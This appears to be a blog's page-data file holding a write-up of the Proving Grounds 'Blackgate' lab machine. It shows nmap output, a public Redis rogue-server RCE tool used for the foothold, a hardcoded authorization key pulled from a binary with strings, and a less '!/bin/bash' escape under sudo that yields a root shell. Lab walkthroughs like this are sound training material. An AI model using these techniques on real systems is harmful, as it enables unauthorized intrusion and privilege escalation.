{"componentChunkName":"component---src-templates-post-template-tsx","path":"/240916/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>1. Recon</h2>\n<p>Starting with nmap scan</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n┌──(hosan㉿kali)-[~/pg/blackgate]\r\n└─$ sudo nmap 192.168.193.176 -p- -T4\r\n[sudo] password for hosan:\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-19 14:50 EDT\r\nNmap scan report for 192.168.193.176\r\nHost is up (0.030s latency).\r\nNot shown: 65533 closed tcp ports (reset)\r\nPORT     STATE SERVICE\r\n22/tcp   open  ssh\r\n6379/tcp open  redis\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 17.69 seconds\r\n</code></pre></div>\n<p>Okay, redis is a databank so far as I know</p>\n<p>Analysing port 6379(redis)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n┌──(hosan㉿kali)-[~/pg/blackgate]\r\n└─$ sudo nmap 192.168.193.176 -p6379 -A -sC -sV\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-19 14:52 EDT\r\nNmap scan report for 192.168.193.176\r\nHost is up (0.030s latency).\r\n\r\nPORT     STATE SERVICE VERSION\r\n6379/tcp open  redis   Redis key-value store 4.0.14\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nAggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 3.5 (87%), Linux 4.4 (87%), Synology DiskStation Manager 5.1 (87%), WatchGuard Fireware 11.8 (87%), Linux 5.3 - 5.4 (87%)\r\nNo exact OS matches for host (test conditions non-ideal).\r\nNetwork Distance: 4 hops\r\n\r\nTRACEROUTE (using port 6379/tcp)\r\nHOP RTT      ADDRESS\r\n1   27.58 ms 192.168.45.1\r\n2   27.60 ms 192.168.45.254\r\n3   28.08 ms 192.168.251.1\r\n4   28.33 ms 192.168.193.176\r\n\r\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\r\nNmap done: 1 IP address (1 host up) scanned in 10.35 seconds\r\n\r\n</code></pre></div>\n<h2>2. Initial Foothold</h2>\n<p>As I searched for redis in searchsploit</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/blackgate]\r\n└─$ searchsploit redis\r\n---------------------------------------------------------------------------------------------- ---------------------------------\r\n Exploit Title                                                                                |  Path\r\n---------------------------------------------------------------------------------------------- ---------------------------------\r\nRedis - Replication Code Execution (Metasploit)                                               | linux/remote/48272.rb\r\nRedis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)                                 | linux/remote/47195.rb\r\nRedis 5.0 - Denial of Service                                                                 | linux/dos/44908.txt\r\nRedis-cli &lt; 5.0 - Buffer Overflow (PoC)                                                       | linux/local/44904.py\r\n---------------------------------------------------------------------------------------------- ---------------------------------\r\nShellcodes: No Results</code></pre></div>\n<p>Our redis version is 4.0.14, we have Unauthenticated RCE Metasploit module.</p>\n<p>But I’ll use python script from:</p>\n<blockquote>\n<p><a href=\"https://github.com/n0b0dyCN/redis-rogue-server\" target=\"_blank\" rel=\"nofollow\">https://github.com/n0b0dyCN/redis-rogue-server</a></p>\n</blockquote>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/306a2/1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.041666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA6ElEQVR42k2Q226EMAxE+ZFKS5OFsJAbbMtd3Xbf+v//Mx2bUvVhZCl2jsdT9GlFP+yI/QofJ7jbAHMNf3q1HoZqmsz+iNa/41onVC7DVpH9gIsJCG3ClDOKLYwYxgehG6bliZgXHZRP+oFQSzVhgaM6gVJ1O8C6COMSDGcvBL+UHkX0M1K/KcinGU17V9jpoqZjqZ6Lb1Qn1b8d6u5wlK2SLpaLijbtBAlsUphretSUuDJ0KMOObvL8gXl9InDpGYfV/nH2qUIyKo0/svodklqaDiXfKnHL/PL+hcfnt0ajkSjIq7P/wB8Q5JepbhJMvgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/a59e9/1.webp 192w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/0ca9f/1.webp 384w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/dc9b9/1.webp 768w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/e2c2f/1.webp 1152w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/f3efb/1.webp 1536w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/801d7/1.webp 1895w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/3b721/1.png 192w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/66595/1.png 384w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/fe486/1.png 768w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/d2d74/1.png 1152w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/e8464/1.png 1536w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/306a2/1.png 1895w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/fe486/1.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Done.</p>\n<h2>3. PrivEsc</h2>\n<p>So after scanning:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n$ sudo -l\r\nsudo -l\r\nMatching Defaults entries for prudence on blackgate:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\r\n\r\nUser prudence may run the following commands on blackgate:\r\n    (root) NOPASSWD: /usr/local/bin/redis-status\r\n$ /usr/local/bin/redis-status\r\n/usr/local/bin/redis-status\r\n[*] Redis Uptime\r\nAuthorization Key:\r\n\r\nWrong Authorization Key!\r\nIncident has been reported!\r\n</code></pre></div>\n<p>Hmm, okay. A binary which we don’t know the code itself -> analyse with strings. Snippet:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n[]A\\A]A^A_\r\n[*] Redis Uptime\r\nAuthorization Key:\r\nClimbingParrotKickingDonkey321\r\n</code></pre></div>\n<p>So this is our authorization key.</p>\n<p>I played around for a while, and :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n\r\n\r\nSep 19 20:26:05 blackgate su[1722]: pam_unix(su-l:auth): authentication failure>\r\nSep 19 20:26:08 blackgate su[1722]: FAILED SU (to root) prudence on pts/0\r\nSep 19 20:26:23 blackgate sudo[1731]: prudence : TTY=pts/0 ; PWD=/usr/local/bin>\r\nSep 19 20:26:23 blackgate sudo[1731]: pam_unix(sudo:session): session opened fo>\r\nSep 19 20:26:27 blackgate sudo[1731]: pam_unix(sudo:session): session closed fo>\r\nSep 19 20:27:18 blackgate sudo[1760]: prudence : TTY=pts/0 ; PWD=/usr/local/bin>\r\nlines 1-23\r\nSep 19 20:27:18 blackgate sudo[1760]: pam_unix(sudo:session): session opened fo>\r\nlines 2-24asdf\r\nlines 2-24-log file: ddfflines 2-24\r\nSep 19 20:27:39 blackgate sudo[1760]: pam_unix(sudo:session): session closed fo>\r\nlines 3-25help\r\nFinishing logfile... (interrupt to abort)...skipping...\r\n\r\n\r\n                   SUMMARY OF LESS COMMANDS\r\n\r\n      Commands marked with * may be preceded by a number, N.\r\n      Notes in parentheses indicate the behavior if N is given.\r\n      A key preceded by a caret indicates the Ctrl key; thus ^K is ctrl-K.\r\n\r\n  h  H                 Display this help.\r\n  q  :q  Q  :Q  ZZ     Exit.\r\n ---------------------------------------------------------------------------\r\n\r\n                           MOVING\r\n\r\n  e  ^E  j  ^N  CR  *  Forward  one line   (or N lines).\r\n  y  ^Y  k  ^K  ^P  *  Backward one line   (or N lines).\r\n  f  ^F  ^V  SPACE  *  Forward  one window (or N lines).\r\n  b  ^B  ESC-v      *  Backward one window (or N lines).\r\n  z                 *  Forward  one window (and set window to N).\r\n  w                 *  Backward one window (and set window to N).\r\n  ESC-SPACE         *  Forward  one window, but don't stop at end-of-file.\r\n  d  ^D             *  Forward  one half-window (and set half-window to N).\r\n  u  ^U             *  Backward one half-window (and set half-window to N).\r\n  ESC-)  RightArrow *  Right one half screen width (or N positions).\r\n</code></pre></div>\n<p>Less? Maybe we can find a way to escalate our privilege by utilizing this command.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/5f1de225b081fc46b49c08c65938ff69/13d24/2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.125%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABGUlEQVR42qVS0W6DMBDj//9v6sNoH6pCNxUKCYUkDYnrC7DSaaumLpLlS+7k+C7JirLA22aDy2Cg+wHGXfGflbXFAYf8HUN9Rl/XsE0DrxTi9TXhrNnvEbTCKEIU9YkrBGdfE8y3O7bpYK4OluzYsrC1ljAwxqT4i5fYTLkQwqPgwLl1lwt0p6EV0bZQRCus9cQcQUPnSk1xm/ITe+8fBTsWHrc5yt0O9bEELYJWfuEZ6zO6xDBMiBFZYKvuzNnRZZAki+JSLPG8T3D2Hs9Y6hJE0LLNUNUYzzUCWxj50iMfR/ZjVcGfTkDf3108gwhGmcH6Frn1O9b5ZxBB13Xwnx/pq8jXSTN5FckhlUe+XqTlKIc/OfwrYsQNEvtcI2rX2lsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5f1de225b081fc46b49c08c65938ff69/a59e9/2.webp 192w,\n/static/5f1de225b081fc46b49c08c65938ff69/0ca9f/2.webp 384w,\n/static/5f1de225b081fc46b49c08c65938ff69/dc9b9/2.webp 768w,\n/static/5f1de225b081fc46b49c08c65938ff69/3a5f0/2.webp 845w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5f1de225b081fc46b49c08c65938ff69/3b721/2.png 192w,\n/static/5f1de225b081fc46b49c08c65938ff69/66595/2.png 384w,\n/static/5f1de225b081fc46b49c08c65938ff69/fe486/2.png 768w,\n/static/5f1de225b081fc46b49c08c65938ff69/13d24/2.png 845w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5f1de225b081fc46b49c08c65938ff69/fe486/2.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>So it seems to be that I have right to execute “less” commands in this “session.”</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">sudo redis-status\r\n[*] Redis Uptime\r\nAuthorization Key: ClimbingParrotKickingDonkey321\r\nClimbingParrotKickingDonkey321\r\nWARNING: terminal is not fully functional\r\n-  (press RETURN)!/bin/bash\r\n!//bbiinn//bbaasshh!/bin/bash\r\nroot@blackgate:/usr/local/bin# whoami\r\nwhoami\r\nroot\r\nroot@blackgate:/usr/local/bin#</code></pre></div>\n<p>Done!</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>Proving Grounds</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"Proving Grounds : Blackgate","summary":"Solving Blackgate machine from Proving Grounds","date":"2024.09.16.","before":"2024.09.13.","after":"2024.09.16.","categories":["proving_grounds","pentest","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA6ElEQVR42k2Q226EMAxE+ZFKS5OFsJAbbMtd3Xbf+v//Mx2bUvVhZCl2jsdT9GlFP+yI/QofJ7jbAHMNf3q1HoZqmsz+iNa/41onVC7DVpH9gIsJCG3ClDOKLYwYxgehG6bliZgXHZRP+oFQSzVhgaM6gVJ1O8C6COMSDGcvBL+UHkX0M1K/KcinGU17V9jpoqZjqZ6Lb1Qn1b8d6u5wlK2SLpaLijbtBAlsUphretSUuDJ0KMOObvL8gXl9InDpGYfV/nH2qUIyKo0/svodklqaDiXfKnHL/PL+hcfnt0ajkSjIq7P/wB8Q5JepbhJMvgAAAABJRU5ErkJggg=="},"images":{"fallback":{"src":"/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/1d243/1.png","srcSet":"/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/9f50d/1.png 474w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/5b801/1.png 948w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/1d243/1.png 1895w","sizes":"(min-width: 1895px) 1895px, 100vw"},"sources":[{"srcSet":"/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/a26bf/1.webp 474w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/436fc/1.webp 948w,\n/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/5eb33/1.webp 1895w","type":"image/webp","sizes":"(min-width: 1895px) 1895px, 100vw"}]},"width":1895,"height":496}},"publicURL":"/static/dbfcf7d061dd9c9e7ccb8cbd564c7029/1.png"}}}}]}},"pageContext":{"slug":"/240916/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}